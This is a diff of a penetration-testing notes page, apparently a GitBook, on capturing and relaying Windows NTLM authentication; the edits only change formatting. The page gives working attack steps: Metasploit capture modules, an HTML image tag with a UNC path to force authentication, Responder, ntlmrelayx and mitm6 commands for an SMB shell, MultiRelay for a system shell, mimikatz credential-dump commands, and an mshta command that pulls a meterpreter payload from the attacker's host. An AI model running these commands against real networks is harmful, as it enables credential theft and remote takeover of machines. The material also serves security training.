@@ -6,27 +6,25 @@ instead of cracking the hashes relay theme to specific machines and potentially 
 
 ## NT/NTLM
 
-The authentication protocol used between Windows clients and servers is called NTLM \(NT LAN Manager\). Although NTLM has been replaced by Kerberos, it is still widely used and supported in Windows machines. For example, it is used either when the client is authenticating to a server using an IP address or, when the client is authenticating to a server that does not belong to the same domain.
+The authentication protocol used between Windows clients and servers is called NTLM (NT LAN Manager). Although NTLM has been replaced by Kerberos, it is still widely used and supported in Windows machines. For example, it is used either when the client is authenticating to a server using an IP address or, when the client is authenticating to a server that does not belong to the same domain.
 
-NTLM authentication is a challenge/response protocol and consists of three messages: Type 1 \(negotiation\), Type 2 \(challenge\) and Type 3 \(authentication\).
+NTLM authentication is a challenge/response protocol and consists of three messages: Type 1 (negotiation), Type 2 (challenge) and Type 3 (authentication).
 
 #### The whole challenge/response works like this:
 
-1. The client sends the Type 1 message, which contains the
+1.  The client sends the Type 1 message, which contains the
 
-   user name \(in plaintext\)
+    user name (in plaintext)
+2.  The server generates the challenge and sends it back to the
 
-2. The server generates the challenge and sends it back to the
+    client
+3.  The client encrypts the challenge with the hash of the user
 
-   client
+    password and returns the results of the computation to the
 
-3. The client encrypts the challenge with the hash of the user
+    server
 
-   password and returns the results of the computation to the
-
-   server
-
-![](../../../.gitbook/assets/image%20%28262%29.png)
+![](<../../../.gitbook/assets/image (262).png>)
 
 
 
@@ -38,51 +36,51 @@ recent Windows operating systems might still store LM hashes for backward compat
 
 The algorithm used to compute the LM Hash is DES and here are the steps used by Windows to do so:
 
-![](../../../.gitbook/assets/image%20%28220%29.png)
+![](<../../../.gitbook/assets/image (220).png>)
 
 The computation of the NTLM Hashes is still very simple:
 
- • The user’s password is converted to UNICODE 
+&#x20;• The user’s password is converted to UNICODE&#x20;
 
-• MD4 is then used to get a 16-byte long hash By using UNICODE, the allowed charset is much wider. 
+• MD4 is then used to get a 16-byte long hash By using UNICODE, the allowed charset is much wider.&#x20;
 
 Although it address some LM flaws, it is still considered weak. Moreover, the NTLM response is sent together with the LM response, most of the time .
 
 he goal of our attack is to gain the password hash through the implementation of this protocol. During the attack we will impersonate the server. Notice that the most important part of the protocol is step 3, where the client hash resides.
 
-The generated hash \(16-bytes long\) is padded with 5 null bytes making it a 21 bytes string.
+The generated hash (16-bytes long) is padded with 5 null bytes making it a 21 bytes string.
 
-![](../../../.gitbook/assets/image%20%28212%29.png)
+![](<../../../.gitbook/assets/image (212).png>)
 
 Note: this is called NTLM hash that is different from the NT hash!!!
 
 This 21 bytes string is split in 3 blocks, 7 bytes long each + 1 parity byte. The response will be then 24 bytes long.
 
-![](../../../.gitbook/assets/image%20%28218%29.png)
+![](<../../../.gitbook/assets/image (218).png>)
 
 Each of these blocks will be the key to encrypt the Server challenge sent during message 2.
 
 Note that in the attack scenario we impersonate the server, and then the challenge is chosen by us.
 
-![](../../../.gitbook/assets/image%20%28224%29.png)
+![](<../../../.gitbook/assets/image (224).png>)
 
 The entire computation will looks like as follow:
 
-![](../../../.gitbook/assets/image%20%28225%29.png)
+![](<../../../.gitbook/assets/image (225).png>)
 
 No diffusion, meaning that each part of DES output is not linked to the previous one. This allows attacks on the three blocks individually.
 
-![](../../../.gitbook/assets/image%20%28213%29.png)
+![](<../../../.gitbook/assets/image (213).png>)
 
-#### The only randomness in the protocol is the server challenge \(step 2 of the protocol\).
+#### The only randomness in the protocol is the server challenge (step 2 of the protocol).
 
-####  • Again, we impersonate the server so we control that.
+#### &#x20;• Again, we impersonate the server so we control that.
 
 #### There are two methods we can use :
 
-#### • Force the client \(target\) to start a connection to us \(fake server\)
+#### • Force the client (target) to start a connection to us (fake server)
 
-####  • Use Man-in-the-Middle techniques in order to sniff the client response
+#### &#x20;• Use Man-in-the-Middle techniques in order to sniff the client response
 
 
 
@@ -90,11 +88,11 @@ No diffusion, meaning that each part of DES output is not linked to the previous
 
 The first item we need to address in this exploitation process, is to create a listening SMB service that will both accept incoming connections, and send back a fixed challenge. As you can imagine, we use a fixed challenge to help us in decrypting the response. Although there are many tools that allow us to do this, we will use the following Metasploit module:
 
-```text
+```
 auxiliary/server/capture/smb
 ```
 
-```text
+```
 use auxiliary/server/capture/http_ntlm
 set JOHNPWFILE httpntlm.txt
 run
@@ -110,23 +108,23 @@ set interface vboxnet0
 run
 ```
 
-set the **JOHNPWFILE option** in order to tell Metasploit to automatically save the hashes to a file. Notice that these hashes will be automatically saved and formatted to work with john the ripper.
+set the **JOHNPWFILE option **in order to tell Metasploit to automatically save the hashes to a file. Notice that these hashes will be automatically saved and formatted to work with john the ripper.
 
-```text
+```
 set JOHNPWFILE hashpwd
 ```
 
 Once the Metasploit listener is set up, we can move on the next step:
 
-One of the easiest ways to force the initiation of the NTLM protocol is through SMB authentication. For example, we can embed a Universal Naming Convention \(UNC\) path \( \SERVER\_IP\SHARE \) into an email message or a web page.
+One of the easiest ways to force the initiation of the NTLM protocol is through SMB authentication. For example, we can embed a Universal Naming Convention (UNC) path ( \SERVER\_IP\SHARE ) into an email message or a web page.
 
 This again, will force the victim’s system to authenticate to the SMB listener on our machine. The following HTML tag will do just fine:
 
-```text
+```
 <img src="\\192.168.102.147\ADMIN$">
 ```
 
-It is very useful to know that when the password length is less than or equal to seven characters \(i.e. 1235467\), the last 8 bytes of the NTLM response are always the same: **2f85252cc731bb25.**
+It is very useful to know that when the password length is less than or equal to seven characters (i.e. 1235467), the last 8 bytes of the NTLM response are always the same: **2f85252cc731bb25.**
 
 {% embed url="https://blog.rapid7.com/2016/07/26/capturing-credentials-on-an-internal-network/" %}
 
@@ -134,23 +132,23 @@ It is very useful to know that when the password length is less than or equal to
 
 first go to responder config file and disable smb and http:
 
-```text
+```
 nano /usr/share/responder/Responder.conf
 ```
 
-![](../../../.gitbook/assets/image%20%28221%29.png)
+![](<../../../.gitbook/assets/image (221).png>)
 
 #### detect machines with smb signing disabled
 
-```text
+```
  nmap --script smb2-security-mode -p 445 192.168.56.1/24
 ```
 
-![](../../../.gitbook/assets/image%20%28219%29.png)
+![](<../../../.gitbook/assets/image (219).png>)
 
 #### turn off smb and http in responder settings
 
-```text
+```
 responder -I vboxnet0 -rdwv
 
 apt install impacket-scripts
@@ -160,35 +158,35 @@ python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -s
 
 #### trigger the attack by opening the attacker ip in the user machine with smb relay turned off
 
-![](../../../.gitbook/assets/image%20%28214%29.png)
+![](<../../../.gitbook/assets/image (214).png>)
 
-![](../../../.gitbook/assets/image%20%28223%29.png)
+![](<../../../.gitbook/assets/image (223).png>)
 
 ## Get an SMB Shell
 
-```text
+```
 python mitm6.py -d megacorp.local -i vboxnet0
 ```
 
 #### we can add -i to get an smb shell if posible
 
-```text
+```
 ntlmrelayx.py -6 -t smb://192.168.56.115 -wh fakewpad.megacorp.local -l lootme  -i
 ```
 
-![](../../../.gitbook/assets/image%20%28217%29.png)
+![](<../../../.gitbook/assets/image (217).png>)
 
 #### we can connect to the shell with netcat:
 
-```text
+```
 nc 127.0.0.1 11000
 ```
 
-![](../../../.gitbook/assets/image%20%28222%29.png)
+![](<../../../.gitbook/assets/image (222).png>)
 
 #### now we are in the victims share directory
 
-```text
+```
 -e [payload.exe]  → to run a payload generated on attackers machine
 
 -c [command] → execute the specified command
@@ -196,21 +194,21 @@ nc 127.0.0.1 11000
 
 #### we can use this instead of ntlmrelayx and get a system level interactive shell:
 
-```text
+```
 python /usr/share/responder/tools/MultiRelay.py -t 192.168.56.119 -u ALL
 ```
 
 if you get error while running the system commmands just edit the multirelay config file and add the right path for syssvc.exe and mimikatz which can be found with ‘locate MultiRelay' commnad:
 
-![](../../../.gitbook/assets/image%20%28215%29.png)
+![](<../../../.gitbook/assets/image (215).png>)
 
 #### after triggering the host we have this:
 
-![](../../../.gitbook/assets/image%20%28227%29.png)
+![](<../../../.gitbook/assets/image (227).png>)
 
-#### we can run mimicatz commands with mimi \[cmd\]:
+#### we can run mimicatz commands with mimi \[cmd]:
 
-```text
+```
 mimi sekurlsa::logonpasswords
 mimi sekurlsa::wdigest
 mimi sekurlsa::Kerberos​
@@ -220,16 +218,16 @@ mimi sekurlsa::Kerberos​
 
 #### we can also use this cmd shell to pop a meterpreter shell:
 
-```text
+```
 use exploit/windows/misc/hta_server
 set payload windows/x64/meterpreter/reverse_tcp
 ```
 
-![](../../../.gitbook/assets/image%20%28226%29.png)
+![](<../../../.gitbook/assets/image (226).png>)
 
 #### now in the cmd shell from multirelay type in :
 
-```text
+```
 mshta.exe http://192.168.56.1:8080/BdssjDFeW7IDPKF.hta
 ```
 
@@ -238,8 +236,6 @@ mshta.exe http://192.168.56.1:8080/BdssjDFeW7IDPKF.hta
 ### other ways to get a meterpreter shell:
 
 {% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" %}
-
-
 
 
 
